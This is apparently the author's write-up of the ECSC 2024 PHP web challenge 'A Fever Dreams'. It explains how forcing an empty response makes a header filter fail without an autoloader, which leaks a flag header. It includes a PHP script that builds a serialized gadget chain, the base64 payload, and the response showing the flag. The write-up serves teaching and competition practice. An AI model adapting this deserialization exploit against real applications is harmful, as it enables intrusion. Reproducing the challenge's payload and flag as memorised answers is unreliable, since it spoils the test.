# ECSC 2024 - Jeopardy

## [WEB] A Fever Dreams (0 solves)

I dreamed about PHP last night. The dream was similar to this challenge.

Author: Riccardo Bonafede <@bonaff>

## Overview

A Fever Dream is a PHP web challenge. Players are given the source code of the application and a URL pointing to a running istance of the challenge. The application is quite simple: there is a form that lets users choose a file from a list, and then it displays its source code. The way it does so it's intentionally overly complicated. Every file to display is built as an object, composed of other sub-objects representing part of the response, such as the body, the head, and some headers. When users request a file, they send a request containing this blob of objects serialized using the PHP standard `serialize` function. The application, after deserializing the object, renders such an object, displaying the requested file.

The flag is located in one such gadget, specifically in the `FlagGadget`, which sets a header in its constructor method (and so, it cannot be arbitrarily deserialized). The `FlagGadget` object is created just after the deserialization process, and it is put in a list of headers to be sent within the response. What is preventing users from getting the flag is a filter in the headers callback. This filter checks if there is any header named `FLAG`, and if there is one with such a name, it will delete it.

## The bug

The bug itself is quite simple, but extremely hidden in the way PHP processes responses. The headers callback is called when the page needs to send the headers to the client. Because headers must be sent _before_ any output is sent, PHP waits to send any header until some output it is flushed.

Because of this, the headers callback can be called in two distinct situations:

1) If there is any output, the callback is called during the normal execution of the script, **inside** the normal context of the application. This happens because headers need to be flushed to the client before the client returns some output.
2) if there is no output, the callback is called **after** the script execution, in a separate context.

This behavior can lead to weird situations and obscure bugs. For example, one thing that can change in different execution contexts is the class autoloader, which will not be present as described in this [issue](https://bugs.php.net/bug.php?id=79718). (Funnily enough, this does not happen for _some_ global variables).

Looking at the challenge, it becomes evident how to exploit this behavior. Below is an excerpt of the code responsible for setting up the filter that prevents us from getting the flag:

```PHP
if ( in_array( $h->get(), [ 'FLAG', 'Location' ] ) ) { // Sets every header
 $filters[] = new HeaderFilterGadget( 'FLAG' ); // Create the filter class
```

If there is no autoloader, PHP will not find any `HeaderFilterGadget` class, and it will crash, **sending the flag header**. Because of this, to get the flag, one only needs to force the application to return a blank page. Because _PHP is a great language_, the HEAD method does not seem to work (and I swear, a couple of months ago it worked, but now, sadly, it doesn't, even using the same setup. Go figure)

## The exploit

There are many ways to return a blank page; the simplest one, I believe, is by abusing the `BufferingClass`. Its `get` method returns the content of the output buffer, clearing the buffer in the process without flushing it. The output of this method can then be passed to the `SerializationGadget` method. Of course, this output is not a valid PHP `serialized` object, so the unserialize function will return **null** (without throwing any fatal error, because, you know, _PHP_).

After adjusting some details, such as the fact that the closure used to get the filename attribute via reflection gets quite upset when accessing a _dynamically set private attribute_ (but not a normal one, because, as before, _PHP_), one can craft the following exploit (which can be improved _a lot_):

```php
function autoload($class_name)
{
    include "gadgets/$class_name.class.php";
}
spl_autoload_register('autoload');

class BufferingGadget{
    private $filename;

    public function set($f){
        $this->$filename = $f;
    }
}

class SerializationGadget{
    private $payload;
    private $filename='';

    public function set($s){
        $this->payload = $s;
    }
}

class Base64Gadget{
    private $str='';
    public $filename=''; // public because of the clousure check.
    public $text; // same as before.

    public function __construct()
    {
        $this->filename = 'test';
    }
    public function set($v){
        $this->text = $v;
    }
}

// root object
$page = new PageGadget;

/** First part, delete the class comment **/
$ser = new SerializationGadget;
$buff = new BufferingGadget;

$ser->set($buff); // Set serialization payload as the output of the buffering gadget

/** Second part: deletes what remains of highlight_string **/
$b64_1 = new Base64Gadget;
$b64_2 = new Base64Gadget;

$b64_1->set($b64_2);

$page->set([], $ser, $b64_1);

print_r($page);
echo base64_encode(serialize($page));
```

Running the script will return the following payload:

```
TzoxMDoiUGFnZUdhZGdldCI6Mzp7czoxNjoiAFBhZ2VHYWRnZXQAaGVhZCI7TzoxOToiU2VyaWFsaXphdGlvbkdhZGdldCI6Mjp7czoyODoiAFNlcmlhbGl6YXRpb25HYWRnZXQAcGF5bG9hZCI7TzoxNToiQnVmZmVyaW5nR2FkZ2V0IjoxOntzOjI1OiIAQnVmZmVyaW5nR2FkZ2V0AGZpbGVuYW1lIjtOO31zOjI5OiIAU2VyaWFsaXphdGlvbkdhZGdldABmaWxlbmFtZSI7czowOiIiO31zOjE2OiIAUGFnZUdhZGdldABib2R5IjtPOjEyOiJCYXNlNjRHYWRnZXQiOjM6e3M6MTc6IgBCYXNlNjRHYWRnZXQAc3RyIjtzOjA6IiI7czo4OiJmaWxlbmFtZSI7czo0OiJ0ZXN0IjtzOjQ6InRleHQiO086MTI6IkJhc2U2NEdhZGdldCI6Mzp7czoxNzoiAEJhc2U2NEdhZGdldABzdHIiO3M6MDoiIjtzOjg6ImZpbGVuYW1lIjtzOjQ6InRlc3QiO3M6NDoidGV4dCI7Tjt9fXM6MTk6IgBQYWdlR2FkZ2V0AGhlYWRlcnMiO2E6MDp7fX0
```

Finally, the attacker just need to feed this payload to the challenge, that will happily return the flag in the headers:

```
HTTP/1.1 200 OK
Server: Apache/2.4.61 (Debian)
X-Powered-By: PHP/8.3.10
FLAG: ECSC{pHp_f3ver_dre4ms_4re_w1ld_00000000}
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
```
